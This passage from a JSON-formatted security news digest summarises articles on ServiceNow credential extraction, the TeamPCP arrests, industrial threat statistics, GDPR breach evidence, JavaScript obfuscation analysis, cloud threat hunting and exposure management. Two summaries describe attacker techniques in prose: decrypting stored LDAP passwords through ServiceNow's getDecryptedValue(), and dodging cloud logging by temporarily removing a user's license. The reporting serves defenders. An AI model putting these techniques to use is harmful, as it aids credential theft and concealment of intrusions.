the password field uses ServiceNow’s \u003ccode\u003ePassword2\u003c/code\u003e data type. The author shows that a new script include can call \u003ccode\u003egetDecryptedValue()\u003c/code\u003e to return cleartext LDAP connection passwords from those records. The post concludes that this is another potential way an attacker with sufficient ServiceNow permissions could extract stored credentials, alongside previously documented ServiceNow post-exploitation techniques.\u003c/p\u003e\n"},{"n":2,"title":"Good riddance, TeamPCP. Now for the hard part.","source":"aikido.dev","sourceColorIdx":7,"link":"https://www.aikido.dev/blog/teampcp-arrested-supply-chain","time":"11:40","priority":"SHOULD READ","score":78,"tldr":"The author welcomes the arrests of two alleged TeamPCP members in Australia, arguing the group showed how small, immature actors can now cause major supply-chain damage by rapidly weaponizing public techniques and AI-assisted tooling. The bigger challenge is that law enforcement and institutions must find ways to respond faster without sacrificing due process.","briefOverview":"\u003cp\u003eThe article responds to announcements from the Australian Federal Police, the FBI, and the Western Australia Police Force that two men in their early 20s were arrested and alleged to be behind TeamPCP. The author says TeamPCP caused significant harm over the past six months through supply chain attacks, while also clarifying that there are no indications the group was behind the original S1ngularity and Shai-Hulud attacks. According to the article, TeamPCP cloned the Shai-Hulud worm, which led to regular reporting that connected them to those attacks.\u003c/p\u003e\n\n\u003cp\u003eThe author describes TeamPCP as a strange threat actor that did not fit neatly into categories such as state actor, organized cybercrime, or purely ideological group. The article says the group was not especially sophisticated, but was dangerous because it could quickly operationalize public exploits, techniques, research, and malware ideas. It also states that LLMs appear to have helped close the gap between seeing an attack technique and deploying it at scale.\u003c/p\u003e\n\n\u003cp\u003eThe broader significance, according to the article, is that small and relatively immature groups can now cause serious harm much faster than institutions can respond. Technical defenses may contain incidents, but the author argues that law enforcement and functioning institutions are needed to impose real consequences. The article warns that attackers can move from an idea to a new campaign in hours or days, while building evidence, coordinating across borders, and reaching a durable outcome can take months or years.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["The Australian Federal Police, the FBI, and the Western Australia Police Force announced the arrest of two men in their early 20s who they allege are behind TeamPCP.","The author states there are no indications that TeamPCP was behind the original S1ngularity and Shai-Hulud attacks, although TeamPCP cloned the worm and was often reported as being behind Shai-Hulud attacks.","The article describes TeamPCP as a group that did not fit neatly into categories such as state actor, organized cybercrime, or purely ideological actor, and says they mixed money, politics, disruption, ego, and attention-seeking.","The author argues that TeamPCP was dangerous not because it was especially sophisticated, but because it could quickly turn public exploits, techniques, research, and malware ideas into large-scale operations, with LLMs appearing to help close that gap.","The article says attackers can now move from an idea to a new campaign in hours or days, while institutions may take months or years to build evidence, coordinate across borders, and reach a durable outcome."],"insights":["Public attribution can blur distinct incidents, as the article emphasizes that TeamPCP cloned Shai-Hulud but is not indicated to be behind the original S1ngularity and Shai-Hulud attacks despite frequent reporting that linked them.","The article frames LLMs as reducing the time between learning about an attack technique and using it at scale, making restraint and maturity as important as technical skill when assessing threat actors.","The author highlights that being noticed by criminal groups is not a sign of status or validation, but a practical personal risk because such attention can become unstable and dangerous.","The article identifies a structural mismatch between attackers and institutions: small groups can launch campaigns in hours or days, while evidence-building, cross-border coordination, and durable legal outcomes can take months or years."],"referencedReports":[],"body":"\u003cp\u003eThe article responds to announcements from the Australian Federal Police, the FBI, and the Western Australia Police Force that two men in their early 20s were arrested and alleged to be behind TeamPCP. The author says TeamPCP caused significant harm over the past six months through supply chain attacks, while also clarifying that there are no indications the group was behind the original S1ngularity and Shai-Hulud attacks. According to the article, TeamPCP cloned the Shai-Hulud worm, which led to regular reporting that connected them to those attacks.\u003c/p\u003e\n\n\u003cp\u003eThe author describes TeamPCP as a strange threat actor that did not fit neatly into categories such as state actor, organized cybercrime, or purely ideological group. The article says the group was not especially sophisticated, but was dangerous because it could quickly operationalize public exploits, techniques, research, and malware ideas. It also states that LLMs appear to have helped close the gap between seeing an attack technique and deploying it at scale.\u003c/p\u003e\n\n\u003cp\u003eThe broader significance, according to the article, is that small and relatively immature groups can now cause serious harm much faster than institutions can respond. Technical defenses may contain incidents, but the author argues that law enforcement and functioning institutions are needed to impose real consequences. The article warns that attackers can move from an idea to a new campaign in hours or days, while building evidence, coordinating across borders, and reaching a durable outcome can take months or years.\u003c/p\u003e\n"},{"n":8,"title":"Threat landscape for industrial automation systems. Q2 2026","source":"securelist.com","sourceColorIdx":5,"link":"https://securelist.com/industrial-threat-report-q2-2026/121159/","time":"10:05","priority":"MAY READ","score":58,"tldr":"Kaspersky reports that the share of ICS computers blocking malicious objects fell to 19.15% in Q2 2026, the lowest level since 2022, though email threats and several categories including ransomware, worms, malicious documents, and AutoCAD malware increased. Biometrics remained the most affected sector, while Africa and East Asia showed notable regional risk growth.","briefOverview":"\u003cp\u003eIn Q2 2026, the percentage of ICS computers on which malicious objects were blocked continued to decrease, falling to 19.15%, the lowest level since 2022. Regionally, the percentages ranged from 8.1% in Northern Europe to 27.9% in Africa. The figures increased in five regions over the quarter, most notably in East Asia and Africa.\u003c/p\u003e\n\n\u003cp\u003eKaspersky security solutions blocked malware from 10,904 different malware families on industrial automation systems during the quarter. The biometrics sector had the highest percentage of ICS computers with blocked malicious objects at 26.44% and led among industries for malicious scripts and phishing pages, malicious documents, spyware, ransomware, worms, and email threats. In biometrics, unlike other industries, the percentage of affected ICS computers for email threats exceeded that for internet threats.\u003c/p\u003e\n\n\u003cp\u003eSeveral threat categories increased over the quarter, including denylisted internet resources, malicious documents, worms, ransomware, and malware for AutoCAD. Among main threat sources, only email increased, reaching 2.84%, while internet threats decreased to 7.61%, removable media threats fell to 0.24%, and network-folder threats fell to 0.023%. Miners reached their lowest levels since 2021 for both Windows executable miners and browser-based web miners.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["In Q2 2026, the percentage of ICS computers on which malicious objects were blocked fell to 19.15%, its lowest level since 2022.","Regionally, the share of attacked ICS computers ranged from 8.1% in Northern Europe to 27.9% in Africa, with increases over the quarter in five regions including East Asia and Africa.","The biometrics sector had the highest percentage of ICS computers with blocked malicious objects at 26.44% and led among industries for several categories including malicious scripts and phishing pages, malicious documents, spyware, ransomware, worms, and email threats.","Kaspersky security solutions blocked malware from 10,904 different malware families on industrial automation systems in Q2 2026.","Among main threat sources, only email increased in Q2 2026, while internet threats fell to 7.61%, removable media threats fell to 0.24%, and network-folder threats fell to 0.023%."],"insights":["The biometrics sector stands out because its email-threat rate exceeds its internet-threat rate, unlike other surveyed industries, and it also has the highest overall share of affected ICS computers.","East Asia’s risk profile broadened in Q2 2026, with increases across all threat categories except miners and leading growth in malicious scripts and phishing pages, spyware, viruses, and internet-sourced threats.","Denylisted internet resources rose globally for the second consecutive quarter and increased in every region, even as the overall percentage of attacked ICS computers continued to decline.","Ransomware increased in nearly all regions despite remaining a low-percentage category globally, and Russia’s biometric systems reached the highest ransomware level reported across all industries and regions at 1.22%.","Miners reached their lowest levels since 2021 in both Windows executable and browser-based forms, while the oil and gas industry still led all selected industries for both miner categories."],"referencedReports":[],"body":"\u003cp\u003eIn Q2 2026, the percentage of ICS computers on which malicious objects were blocked continued to decrease, falling to 19.15%, the lowest level since 2022. Regionally, the percentages ranged from 8.1% in Northern Europe to 27.9% in Africa. The figures increased in five regions over the quarter, most notably in East Asia and Africa.\u003c/p\u003e\n\n\u003cp\u003eKaspersky security solutions blocked malware from 10,904 different malware families on industrial automation systems during the quarter. The biometrics sector had the highest percentage of ICS computers with blocked malicious objects at 26.44% and led among industries for malicious scripts and phishing pages, malicious documents, spyware, ransomware, worms, and email threats. In biometrics, unlike other industries, the percentage of affected ICS computers for email threats exceeded that for internet threats.\u003c/p\u003e\n\n\u003cp\u003eSeveral threat categories increased over the quarter, including denylisted internet resources, malicious documents, worms, ransomware, and malware for AutoCAD. Among main threat sources, only email increased, reaching 2.84%, while internet threats decreased to 7.61%, removable media threats fell to 0.24%, and network-folder threats fell to 0.023%. Miners reached their lowest levels since 2021 for both Windows executable miners and browser-based web miners.\u003c/p\u003e\n"},{"n":5,"title":"Detection Isn’t Proof: The 72-Hour-Evidence Problem","source":"netskope.com","sourceColorIdx":2,"link":"https://www.netskope.com/blog/detection-isnt-proof-the-72-hour-evidence-problem","time":"07:01","priority":"MAY READ","score":55,"tldr":"Organizations often can detect security incidents but cannot quickly prove what happened across data systems within GDPR’s 72-hour breach notification window. The key takeaway is that audit-ready evidence must be built continuously through classification, lineage, and policy records before an incident occurs, not assembled after the clock starts.","briefOverview":"\u003cp\u003eThe article argues that discovering a potential breach starts a 72-hour GDPR notification clock, but many organizations cannot quickly produce a comprehensive and auditable evidence trail. It cites research conducted by Cybersecurity Insiders, involving more than 1,000 security practitioners at organizations with 2,500 or more employees. According to the article, only 12% of organizations can quickly produce a comprehensive and auditable chain of custody when regulators, auditors, or legal teams ask for it.\u003c/p\u003e\n\n\u003cp\u003eThe article says the main gap is not simply detecting incidents, but proving what happened before and after an alert across every system the data touched. Almost 50% of organizations require significant manual effort across multiple systems to produce that evidence or struggle to produce it at all, and 27% cannot reconstruct a sensitive data path before the 72-hour window closes. The evidence problem becomes harder when data changes form, because only 9% of organizations can reliably recognize sensitive data after it has been renamed, reformatted, summarized by an AI tool, or pasted into a new document.\u003c/p\u003e\n\n\u003cp\u003eThe article says organizations that meet regulatory deadlines usually build classification, lineage, and policy-event records into daily operations before an incident occurs. It presents Netskope One Data Security, including Netskope One DSPM, Netskope One DLP, Netskope One Data Lineage, and Netskope One DataSec Command Center, as tools intended to maintain classification and lineage across environments where sensitive data is stored, used, copied, and transformed. The article concludes that the outcome of the 72-hour deadline depends on whether the evidence trail already exists or must be built while the clock is running.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["GDPR requires breach notification within 72 hours, but many organizations struggle to produce comprehensive and auditable evidence before that deadline.","Research conducted by Cybersecurity Insiders involving more than 1,000 security practitioners found that only 12% of organizations can quickly produce a comprehensive and auditable chain of custody.","Only 9% of organizations can reliably recognize sensitive data after it has been modified, such as being renamed, reformatted, summarized by an AI tool, or pasted into a new document.","The article says organizations that meet regulatory deadlines usually build classification, lineage, and policy-event records into daily operations before an incident occurs.","Netskope One Data Security, including Netskope One DSPM, Netskope One DLP, Netskope One Data Lineage, and Netskope One DataSec Command Center, is described as maintaining classification and lineage across environments where sensitive data is stored, used, copied, and transformed."],"insights":["The article distinguishes detection maturity from evidence readiness, arguing that organizations can be good at spotting incidents while still being unable to prove what happened in a regulator-ready way.","The weakest point in auditability appears to be transformed data, because confidence drops sharply when sensitive content is renamed, reformatted, summarized by AI, or pasted into new locations.","Organizations that meet regulatory deadlines are described as having built evidence trails before incidents begin, making evidence a byproduct of routine data governance rather than an emergency deliverable.","The article frames AI-generated summaries and rewritten content as a practical breakdown point for conventional audit trails, since sensitive information can move even when the original file remains untouched."],"referencedReports":[{"title":"2026 Unified Data Security Report","url":"https://www.netskope.com/resources/reports-guides/2026-unified-data-security-report","publisher":"Cybersecurity Insiders and Netskope","context":"The article says its data comes from research conducted by Cybersecurity Insiders involving more than 1,000 security practitioners and links to the 2026 Unified Data Security Report for the full findings.","category":"research","primary":true}],"body":"\u003cp\u003eThe article argues that discovering a potential breach starts a 72-hour GDPR notification clock, but many organizations cannot quickly produce a comprehensive and auditable evidence trail. It cites research conducted by Cybersecurity Insiders, involving more than 1,000 security practitioners at organizations with 2,500 or more employees. According to the article, only 12% of organizations can quickly produce a comprehensive and auditable chain of custody when regulators, auditors, or legal teams ask for it.\u003c/p\u003e\n\n\u003cp\u003eThe article says the main gap is not simply detecting incidents, but proving what happened before and after an alert across every system the data touched. Almost 50% of organizations require significant manual effort across multiple systems to produce that evidence or struggle to produce it at all, and 27% cannot reconstruct a sensitive data path before the 72-hour window closes. The evidence problem becomes harder when data changes form, because only 9% of organizations can reliably recognize sensitive data after it has been renamed, reformatted, summarized by an AI tool, or pasted into a new document.\u003c/p\u003e\n\n\u003cp\u003eThe article says organizations that meet regulatory deadlines usually build classification, lineage, and policy-event records into daily operations before an incident occurs. It presents Netskope One Data Security, including Netskope One DSPM, Netskope One DLP, Netskope One Data Lineage, and Netskope One DataSec Command Center, as tools intended to maintain classification and lineage across environments where sensitive data is stored, used, copied, and transformed. The article concludes that the outcome of the 72-hour deadline depends on whether the evidence trail already exists or must be built while the clock is running.\u003c/p\u003e\n"},{"n":10,"title":"JavaScript obfuscation: From party trick to phishing kit","source":"blog.talosintelligence.com","sourceColorIdx":6,"link":"https://blog.talosintelligence.com/javascript-obfuscation-from-party-trick-to-phishing-kit/","time":"10:00","priority":"MAY READ","score":55,"tldr":"Obfuscated JavaScript is common in phishing kits, malware loaders, compromised sites, and npm packages, and beautifying alone is not enough to understand it. Analysts should safely preserve and inspect samples by decoding strings, identifying execution sinks, capturing generated payloads, and observing behavior in an isolated environment.","briefOverview":"\u003cp\u003eThe article explains how obfuscated JavaScript hides useful context by ruining names, concealing strings, encoding URLs, using runtime decoders, and pushing real behavior into execution time. It appears in phishing pages, malware loaders, suspicious browser scripts, compromised sites, npm install scripts, and some legitimate software protection. The author frames the goal as turning hidden behavior into observable behavior rather than simply trying to read messy code.\u003c/p\u003e\n\n\u003cp\u003eThe article stresses that unknown JavaScript samples should be treated as hostile before analysis begins. Analysts should preserve the original, work on a copy, and avoid running the code on normal machines, browser profiles, or environments with credentials, tokens, cloud secrets, SSH agents, clipboard contents, or corporate proxy details. It also warns that AI tools can help with isolated snippets and recovered artifacts, but they are not sandboxes or evidence sources by themselves.\u003c/p\u003e\n\n\u003cp\u003eKey techniques described include string hiding, lookup tables, dynamic property access, dead code, runtime code generation, control-flow flattening, anti-debugging, anti-analysis checks, JSFuck, and output from tools such as javascript-obfuscator and obfuscator.io. Beautifying with tools such as Biome or Prettier can improve readability, but it does not recover original names, decode runtime strings, or restore hidden logic. The recommended workflow is to preserve the sample, make a safe copy, beautify as a first pass, extract strings, identify execution sinks, capture generated payloads, observe behavior in a controlled environment, and repeat until the code stops hiding behind ceremony.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["Obfuscated JavaScript preserves execution while stripping useful context, hiding strings, damaging names, and pushing real behavior into runtime.","The article says analysts should assume unknown JavaScript samples are hostile, work on copies, preserve originals, and avoid running them on normal machines or browser profiles.","Beautifying JavaScript with tools such as Biome or Prettier can restore indentation and readability, but it does not recover original variable names, decode runtime strings, or restore hidden program logic.","Common obfuscation techniques include string hiding, lookup tables, dynamic property access, runtime code generation, control-flow flattening, anti-debugging checks, and dead-code noise.","The article recommends a repeatable workflow of preserving the original, making a safe copy, beautifying as a first pass, extracting strings, identifying execution sinks, capturing generated payloads, and observing behavior in a controlled environment."],"insights":["The article emphasizes replacing execution sinks such as eval with logging so analysts can capture reconstructed payloads instead of letting the script execute them.","Obfuscation often aims to waste the analyst’s first few minutes rather than remain hidden forever, using delays, debugger traps, console tampering, and environment checks to slow inspection.","Node.js obfuscation can be more serious than browser JavaScript because install and build scripts may access environment variables, files, tokens, SSH keys, and CI secrets.","AI tools are useful for decoding snippets, renaming variables, and summarizing recovered payloads, but the article stresses that they are not sandboxes and should not be given hostile or sensitive material indiscriminately.","The article advises focusing on what obfuscated code produces at runtime rather than spending time understanding every layer of wrapper logic or punctuation-heavy encodings like JSFuck."],"referencedReports":[],"body":"\u003cp\u003eThe article explains how obfuscated JavaScript hides useful context by ruining names, concealing strings, encoding URLs, using runtime decoders, and pushing real behavior into execution time. It appears in phishing pages, malware loaders, suspicious browser scripts, compromised sites, npm install scripts, and some legitimate software protection. The author frames the goal as turning hidden behavior into observable behavior rather than simply trying to read messy code.\u003c/p\u003e\n\n\u003cp\u003eThe article stresses that unknown JavaScript samples should be treated as hostile before analysis begins. Analysts should preserve the original, work on a copy, and avoid running the code on normal machines, browser profiles, or environments with credentials, tokens, cloud secrets, SSH agents, clipboard contents, or corporate proxy details. It also warns that AI tools can help with isolated snippets and recovered artifacts, but they are not sandboxes or evidence sources by themselves.\u003c/p\u003e\n\n\u003cp\u003eKey techniques described include string hiding, lookup tables, dynamic property access, dead code, runtime code generation, control-flow flattening, anti-debugging, anti-analysis checks, JSFuck, and output from tools such as javascript-obfuscator and obfuscator.io. Beautifying with tools such as Biome or Prettier can improve readability, but it does not recover original names, decode runtime strings, or restore hidden logic. The recommended workflow is to preserve the sample, make a safe copy, beautify as a first pass, extract strings, identify execution sinks, capture generated payloads, observe behavior in a controlled environment, and repeat until the code stops hiding behind ceremony.\u003c/p\u003e\n"},{"n":16,"title":"What Cloud Threat Hunting Is and How to Run One | Mitiga","source":"mitiga.io","sourceColorIdx":0,"link":"https://www.mitiga.io/blog/understanding-cloud-threat-hunting","time":"15:13","priority":"MAY READ","score":52,"tldr":"Cloud threat hunting is a hypothesis-driven investigation process that complements detection by digging into suspicious activity across cloud and SaaS environments. Its effectiveness depends heavily on collecting and retaining the right cloud logs before providers delete them or licensing gaps leave activity unrecorded.","briefOverview":"\u003cp\u003eThe article explains cloud threat hunting as a hypothesis-driven process for investigating security events in cloud environments. It says hunting complements detection because a single indicator, such as an authentication failure, may be either a harmless user mistake or a sign of an attempted account compromise. Detection uses lightweight pattern recognition and may produce false positives, while hunting involves deeper investigation into activity that appears to be an actual attack.\u003c/p\u003e\n\n\u003cp\u003eThe article describes three approaches to cloud hunts: strategic, event-driven, and continuous. Strategic hunts focus on adversary behavior in a specific technology or platform, such as data exfiltration from object storage or compromise of a SaaS authentication process. Event-driven hunts use details from malicious events that happened elsewhere, while continuous hunts run ongoing checks in cloud and SaaS environments against indicators of attacks.\u003c/p\u003e\n\n\u003cp\u003eA major focus of the article is that cloud hunts depend on logs, but cloud and SaaS logging can be difficult to control. Some cloud provider logs may not be accessible, logging may depend on licensing, and vendors may keep logs only for limited periods. The article warns that attackers can exploit licensing-based logging gaps and recommends capturing logs into a security data lake before cloud vendors delete them.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["Cloud threat hunting is a hypothesis-driven process for investigating security events in cloud environments and complements detection by digging into suspicious indicators in more detail.","Detection uses lightweight pattern recognition and may generate false positives, while hunting invests time and resources into investigating activity that appears to be an actual attack.","The article describes three approaches to cloud hunting: strategic hunts focused on adversary behavior, event-driven hunts based on malicious events affecting others, and continuous hunts that regularly check cloud and SaaS environments for attack indicators.","Cloud threat hunting depends on access to logs, but cloud and SaaS log availability can be limited by provider access, service licensing, and vendor retention periods.","Organizations should capture cloud logs into a security data lake before cloud vendors delete them so they have the data needed for hunting."],"insights":["An attacker could temporarily remove a user’s license, perform malicious activity through that account, and then restore the license so that the user may not notice and no logs are left behind.","Cloud logging gaps are not only a visibility problem for defenders; the article says attackers can actively exploit differences between free and enterprise logging tiers.","Cloud threat hunts may require more complicated log analysis than detection because detection is designed to quickly flag possible targets of interest, even at the cost of false positives.","For event-driven hunts, researchers may try to replicate an attack in a research and development environment after gathering information about a malicious event that affected someone else."],"referencedReports":[],"body":"\u003cp\u003eThe article explains cloud threat hunting as a hypothesis-driven process for investigating security events in cloud environments. It says hunting complements detection because a single indicator, such as an authentication failure, may be either a harmless user mistake or a sign of an attempted account compromise. Detection uses lightweight pattern recognition and may produce false positives, while hunting involves deeper investigation into activity that appears to be an actual attack.\u003c/p\u003e\n\n\u003cp\u003eThe article describes three approaches to cloud hunts: strategic, event-driven, and continuous. Strategic hunts focus on adversary behavior in a specific technology or platform, such as data exfiltration from object storage or compromise of a SaaS authentication process. Event-driven hunts use details from malicious events that happened elsewhere, while continuous hunts run ongoing checks in cloud and SaaS environments against indicators of attacks.\u003c/p\u003e\n\n\u003cp\u003eA major focus of the article is that cloud hunts depend on logs, but cloud and SaaS logging can be difficult to control. Some cloud provider logs may not be accessible, logging may depend on licensing, and vendors may keep logs only for limited periods. The article warns that attackers can exploit licensing-based logging gaps and recommends capturing logs into a security data lake before cloud vendors delete them.\u003c/p\u003e\n"},{"n":3,"title":"How to build an exposure management program the business trusts: Lessons from Tenable’s CSO","source":"tenable.com","sourceColorIdx":5,"link":"https://www.tenable.com/blog/how-to-build-an-exposure-management-program-the-business-trusts-lessons-from-tenables-cso","time":"14:30","priority":"MAY READ","score":45,"tldr":"Tenable’s CSO says shifting from siloed security tools and technical metrics to a unified exposure management program helped the company prioritize risk by business impact and give executives clearer answers about security posture. The key takeaway is that CISOs need consolidated, business-contextual risk data to build trust with boards and operational teams, especially as AI expands the attack surface.","briefOverview":"\u003cp\u003eTenable’s CSO Robert Huber describes how the company shifted to an AI-driven exposure management program to address security tool sprawl, fragmented data, and siloed teams. He says Tenable’s security organization managed around 50 different tools, each with separate views, workflows, metrics, and reporting. This made it difficult to assess cyber risk holistically and to explain security posture clearly to the C-suite and board.\u003c/p\u003e\n\n\u003cp\u003eHuber says board members generally wanted answers to two questions: whether Tenable was secure and how it compared to peers. The company’s previous reporting relied heavily on operational metrics such as vulnerability counts and scanned assets, which did not translate clearly into business impact. Tenable’s exposure management approach aims to connect security findings to business units, revenue streams, and prioritized actions that reduce risk.\u003c/p\u003e\n\n\u003cp\u003eTenable broadened its vulnerability management team into an exposure management team covering traditional CVEs, misconfigurations, identity weaknesses, cloud workloads, AI tools, on-prem assets, and the application development pipeline. The company chose not to build its own security data warehouse and instead adopted a SaaS-based approach, later acquiring Vulcan Cyber and making it part of the Tenable One Exposure Management Platform. Huber says the resulting program uses simplified red, yellow, and green metrics, asset tagging, automated identification of systemic issues, and customized SLAs to give business and technical teams a more trusted view of cyber exposure.\u003c/p\u003e\n","standardSynthesis":"","comprehensiveSynthesis":"","keyPoints":["Tenable’s CSO Robert Huber says security tool sprawl and data silos made it difficult to assess the company’s cyber risk holistically and communicate it clearly to business leaders.","Tenable shifted from a vulnerability management team to an exposure management team with a broader mandate covering issues such as misconfigurations and identity weaknesses across identity systems, cloud workloads, AI tools, on-prem assets, and the application development pipeline.","Tenable chose not to build its own data warehouse for security risk data and instead selected a SaaS solution, later acquiring Vulcan Cyber and making it part of the Tenable One Exposure Management Platform.","The exposure management approach lets Tenable present simplified red, yellow, and green cyber exposure metrics for lines of business and tie assets to business units and revenue streams.","Huber argues that unified exposure management helps replace fragmented reports and operational metrics with prioritized actions that reduce risk and are easier for the C-suite, board, and business teams to trust."],"insights":["Tenable’s exposure management shift did not require increased headcount; the company centralized triage while allowing specialized teams like cloud security and application security to spend less time chasing remediation and more time securing deployments.","Huber’s board reporting problem was not a lack of metrics but an excess of operational metrics that failed to answer the board’s two core questions: whether Tenable was secure and how it compared to peers.","Tenable decided against building its own security data warehouse because Huber viewed the infrastructure, data, and staffing costs as outside the company’s core competency and likely to become expensive quickly.","Tenable’s use of asset tagging to connect infrastructure to business units and revenue streams made it possible to prioritize security work by business impact rather than by raw vulnerability counts.","The article frames unpatchable assets as systemic root-cause issues to be flagged and managed, rather than simply adding their individual vulnerabilities to a remediation list."],"referencedReports":[],"body":"\u003cp\u003eTenable’s CSO Robert Huber describes how the company shifted to an AI-driven exposure management program to address security tool sprawl, fragmented data, and siloed teams. He says Tenable’s security organization managed around 50 different tools, each with separate views, workflows, metrics, and reporting. This made it difficult to assess cyber risk holistically and to explain security posture clearly to the C-suite and board.\u003c/p\u003e\n\n\u003cp\u003eHuber says board members generally wanted answers to two questions: whether Tenable was secure and how it compared to peers. The company’s previous reporting relied heavily on operational metrics such as vulnerability counts and scanned assets, which did not translate clearly into business impact. Tenable’s exposure management approach aims to connect security findings to business units, revenue streams, and prioritized actions that reduce risk.\u003c/p\u003e\n\n\u003cp\u003eTenable broadened its vulnerability management team into an exposure management team covering traditional CVEs, misconfigurations, identity weaknesses, cloud workloads, AI tools, on-prem assets, and the application development pipeline. The company chose not to build its own security data warehouse and instead adopted a SaaS-based approach, later acquiring Vulcan Cyber and making it part of the Tenable One Exposure Management Platform. Huber says the resulting program uses simplified red, yellow, and green metrics, asset tagging, automated identification of systemic issues, and customized SLAs to give business and technical teams a more trusted view of cyber exposure.\u003c/p\u003e\n"},{"n":6,"title":"Why SpecterOps Signed OpenAI’s Call for Collective Cyber Defense","source":"specterops.io","sourceColorIdx":1,"link":"https://specterops.io/blog/2026/08/27/specterops-openai-collective-cyber-defense/","time":"17:45","priority":"MAY READ","score":45,"tldr":"SpecterOps signed OpenAI’s collective cyber defense call, arguing that AI will accelerate exploitation of existing weaknesses and defenders need broad, governed access to advanced AI tools. The company emphasizes transparency, attack path management, and shared research to help organizations find and eliminate dangerous identity and permission paths to critical assets.","briefOvervie
